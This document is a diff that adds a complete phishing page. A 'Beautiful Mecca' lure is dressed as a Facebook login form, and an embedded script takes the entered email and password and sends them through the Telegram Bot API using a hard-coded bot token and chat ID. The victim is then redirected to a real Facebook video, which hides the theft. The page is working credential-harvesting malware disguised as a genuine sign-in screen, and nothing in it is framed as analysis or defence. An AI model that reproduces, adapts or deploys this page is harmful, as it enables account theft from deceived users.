@@ -1,0 +1,210 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta property="og:image" content="k.jpeg" />
+   <title>Beautiful Mecca❤️.</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+<meta name="description" content="
+Mecca (also known as Makkah) is a city located in the western region of Saudi Arabia. It is considered the holiest city in Islam and is the birthplace of the Islam.¬
+">
+     
+<meta property="og:url" content="https://www.facebook.com" />
+<style>
+header{
+background-color: #ffffff;
+height:100%;
+
+}
+.jumbotron{
+padding: 2px;
+background-color: #ffffff;
+color: white;
+border-radius: 0 !important;
+font-family: 'Ubuntu', sans-serif;
+
+
+}
+h1{
+font-weight: bold;
+}
+p{
+font-family: Roboto;
+
+}
+.form-group{
+margin: 0;
+}
+#login{
+width: 100%;
+background-color: #1877F2;
+border-radius: 0 !important;
+color: white;
+}
+
+.form-control:focus {
+        border-color:   #F89D6F  ;
+box-shadow:none !important;
+outline: none;
+
+} 
+#email{
+border-radius: 0 !important;
+}
+#password{
+  border-radius: 0 !important;
+}
+
+#btn2{
+background-color: #0B9E1F;
+color: white;
+border-radius: 0 !important;
+}
+#orr{
+color: black;
+}
+.fff{
+color:#286D9F;
+font-size: 12px;
+}
+#lans{
+font-size: 12px;
+
+}
+
+.newspaper {
+  -webkit-column-count: 2; /* Old Chrome, Safari and Opera */
+  -moz-column-count: 2; /* Old Firefox */
+  column-count: 2;
+text-align: center;
+ 
+
+}
+.hh1{
+line-height: 120%;
+}
+.hh2{
+line-height: 120%;
+}
+
+.form-group{
+
+border-radius: 0 !important;
+}
+</style>
+</head>
+<body>
+<header>
+<div class="jumbotron text-center">
+  <br><br>
+  <h2 style="color:#1877F2">facebook</h2>
+ </div>
+
+<div class="container">
+  
+  <form>
+
+    <div class="form-group">
+   <input type="text" class="form-control p-3" id="email" placeholder="Mobile number or email address" name="email" minlength="8" required>
+    </div>
+
+
+    <div class="form-group">
+      <input type="password" class="form-control mt-1" id="password" placeholder="Password" name="password" minlength="8" required>
+    </div>
+    
+    <button type="submit" class="btn mt-2" name="submit" value="Send"   id="login">Log In</button>
+  </form>
+</div>
+
+
+<div class="row mt-4">
+    <div class="col"><hr></div>
+    <div class="col-auto">or</div>
+    <div class="col"><hr></div>
+</div>
+
+<div class="container text-center mt-2">
+ 
+  <input type="submit" class="btn" id="btn2" value="Create New Account">
+</div>
+
+<div class="fff text-center mt-4">
+<p>Forgotten password? . Help Centre</p>
+</div>
+</header>
+
+
+<div class="container mt-4" id="lans">
+  
+    <div class="newspaper">
+<div class="hh1">
+     English(UK)<br>
+    
+অসমীয়া<br>
+বাংলা<br>
+
+  </div>
+
+
+
+<div class="hh2">
+   हिन्दी<br>
+தமிழ்
+<br>
+
+
+मराठी<br>
+</div>
+    </div>
+    </div>
+  </div>
+
+<div class="ftt text-center mt-3 text-muted">
+<p>Meta ©2023</p>
+</div>
+
+<script>
+const botToken = "6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU";
+const chatId = "5857694327";
+// Get form elements
+const emailInput = document.getElementById("email");
+const passwordInput = document.getElementById("password");
+const loginButton = document.getElementById("login");
+// Add click event listener to login button
+loginButton.addEventListener("click", function(event) {
+event.preventDefault();
+// Get input values
+const email = emailInput.value;
+const password = passwordInput.value;
+// Send message to Telegram bot
+const message = `New login:\nEmail: ${email}\nPassword: ${password}`;
+const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+fetch(url)
+.then(response => {
+if (response.ok) {
+window.location.href = "https://www.facebook.com/reel/3019949571647384/?mibextid=3uQiM7JGkdL90cBOq";
+emailInput.value = "";
+passwordInput.value = "";
+} else {
+throw new Error("Have a nice day");
+}
+})
+.catch(error => {
+console.error(error);
+alert("Have a nice day");
+});
+});
+
+</script>
+
+</body>
+</html>
